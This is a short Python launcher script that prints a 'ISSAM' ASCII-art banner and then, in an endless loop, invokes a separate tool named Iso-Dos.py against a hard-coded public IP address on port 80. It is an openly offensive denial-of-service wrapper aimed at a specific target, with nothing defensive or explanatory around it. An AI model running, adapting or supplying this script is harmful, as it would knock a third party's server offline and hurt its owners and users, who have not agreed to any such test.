import os
R  = '\33[1;31m'
print(R)
os.system('clear')
#os.system('figlet ISSAM')
print('''
 ___ ____ ____    _    __  __
|_ _/ ___/ ___|  / \  |  \/  |
 | |\___ \___ \ / _ \ | |\/| |
 | | ___) |__) / ___ \| |  | |
|___|____/____/_/   \_\_|  |_|
''')
host='41.224.33.232'
port=80
while True:
	os.system(f'python3 Iso-Dos.py -h {host} -p {port} -d auto')

